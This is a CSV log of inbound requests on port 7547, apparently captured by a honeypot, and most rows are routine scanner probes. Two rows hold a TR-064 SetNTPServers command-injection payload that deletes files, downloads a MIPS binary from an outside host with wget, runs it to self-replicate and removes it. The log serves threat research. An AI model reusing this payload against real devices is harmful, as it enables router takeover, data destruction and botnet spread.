ID,ADDR,VALUE,TIME
REQ_1_P7547,,b'GET / HTTP/1.1\r\nHost: 3.14.69.228\r\n\r\n',2022-05-02 23:13:56.686628
REQ_2_P7547,"('39.105.54.139', 39970)","b'POST /UD/act?1 HTTP/1.1\r\nHost: 127.0.0.1:7547\r\nUser-Agent: Messiah/2.0\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\nContent-Length: 526\r\n<?xml version=""1.0""?><SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/""> <SOAP-ENV:Body>  <u:SetNTPServers xmlns:u=""urn:dslforum-org:service:Time:1"">   <NewNTPServer1>`rm -rf *;cd /tmp;wget http://51.81.133.91/FKKK/NW_BBBmips; chmod 777 NW_BBBmips; ./NW_BBBmips TR-064.Selfrep; rm -rf NW_BBBmips`</NewNTPServer1>   <NewNTPServer2></NewNTPServer2>   <NewNTPServer3></NewNTPServer3>   <NewNTPServer4></NewNTPServer4>   <NewNTPServer5></NewNTPServer5>  </u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>'",2022-05-10 18:32:09.748675
REQ_3_P7547,"('39.105.54.139', 40026)","b'POST /UD/act?1 HTTP/1.1\r\nHost: 127.0.0.1:7547\r\nUser-Agent: Messiah/2.0\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\nContent-Length: 526\r\n<?xml version=""1.0""?><SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/""> <SOAP-ENV:Body>  <u:SetNTPServers xmlns:u=""urn:dslforum-org:service:Time:1"">   <NewNTPServer1>`rm -rf *;cd /tmp;wget http://51.81.133.91/FKKK/NW_BBBmips; chmod 777 NW_BBBmips; ./NW_BBBmips TR-064.Selfrep; rm -rf NW_BBBmips`</NewNTPServer1>   <NewNTPServer2></NewNTPServer2>   <NewNTPServer3></NewNTPServer3>   <NewNTPServer4></NewNTPServer4>   <NewNTPServer5></NewNTPServer5>  </u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>'",2022-05-10 18:32:09.970983
REQ_4_P7547,"('205.210.31.10', 56475)","b'GET / HTTP/1.0\r\nUser-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com\r\nAccept: */*\r\n\r\n'",2022-05-11 00:48:53.388668
REQ_5_P7547,"('205.210.31.28', 60552)","b'GET / HTTP/1.0\r\nUser-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com\r\nAccept: */*\r\n\r\n'",2022-05-12 01:25:15.354751
REQ_6_P7547,"('106.75.190.116', 35902)",b'GET / HTTP/1.0\r\nHost: 54.91.30.20:7547\r\nAccept: */*\r\n\r\n',2022-05-13 12:54:01.280611
REQ_7_P7547,"('205.210.31.17', 61868)","b'GET / HTTP/1.0\r\nUser-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com\r\nAccept: */*\r\n\r\n'",2022-05-14 01:16:34.753328
REQ_8_P7547,"('23.129.64.138', 21545)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:7547\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\r\nConnection: close\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-16 14:55:18.759711
REQ_9_P7547,"('199.249.230.87', 40796)",b'\x00\x00\x001\xffSMBr\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x0e\x00\x02NT LM 0.12\x00\x02\x00',2022-05-16 14:55:22.538119
REQ_10_P7547,"('23.129.64.139', 6859)",b'\x00\x00\x00n\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x02\x10\x02\x00\x03\x02\x03\x11\x03',2022-05-16 14:55:23.387968
REQ_11_P7547,"('185.220.101.49', 19158)",b'\x12\x01\x00\x1a\x00\x00\x00\x00\x00\x00\x0b\x00\x06\x01\x00\x11\x00\x01\xff\x08\x00\x01U\x00\x00\x01',2022-05-16 14:55:27.100540
REQ_12_P7547,"('185.220.100.242', 4500)","b""\x03\x00\x00,'\xe0\x00\x00\x00\x00\x00Cookie: mstshash=eltons\r\n\x01\x00\x08\x00\x03\x00\x00\x00""",2022-05-16 14:55:38.077435
REQ_13_P7547,"('23.129.64.145', 24953)",b'',2022-05-16 14:55:42.741917
REQ_14_P7547,"('23.129.64.145', 25039)","b'\x16\x03\x01\x00\xee\x01\x00\x00\xea\x03\x03\x99\\p\x18^l#\x85\xe4a\xa6\x146\xed\xaf_tfB}-\xed\xcc\xbb\x1d5\xd89\x85\xee\r\n \xa4S$4\x7f\xc8\x04\xbfbR\x8fe$\rII\xa8Ym.\x930\x8e\x1a\x01\xa8\x10X\xb7\x8aoc\x00&\xc0+\xc0/\xc0,\xc00\xcc\xa9\xcc\xa8\xc0\t\xc0\x13\xc0\n\xc0\x14\x00\x9c\x00\x9d\x00/\x005\xc0\x12\x00\n\x13\x01\x13\x02\x13\x03\x01\x00\x00{\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\n\x00\n\x00\x08\x00\x1d\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\r\x00\x1a\x00\x18\x08\x04\x04\x03\x08\x07\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x05\x03\x06\x03\x02\x01\x02\x03\xff\x01\x00\x01\x00\x00\x12\x00\x00\x00+\x00\t\x08\x03\x04\x03\x03\x03\x02\x03\x01\x003\x00&\x00$\x00\x1d\x00 \x8a\xce\xad\xe7\xc9\xbe_Qq\x9d\xe9\xcb\x97\xf3\xd3F\xf3e\x85\xbe\xe4\x98Uc$\xd9^=\x8e-*D'",2022-05-16 14:55:46.296385
REQ_15_P7547,"('23.129.64.135', 13237)",b'',2022-05-16 14:55:47.398475
REQ_16_P7547,"('152.32.216.16', 53616)",b'',2022-05-16 15:27:19.379612
REQ_17_P7547,"('152.32.216.16', 59918)",b'GET / HTTP/1.1\r\nUser-Agent: curl/7.29.0\r\nHost: 54.91.30.20\r\nAccept: */*\r\n\r\n',2022-05-16 15:27:19.848248
REQ_18_P7547,"('152.32.216.16', 62122)",b'\r\n\r\n',2022-05-16 15:27:22.157854
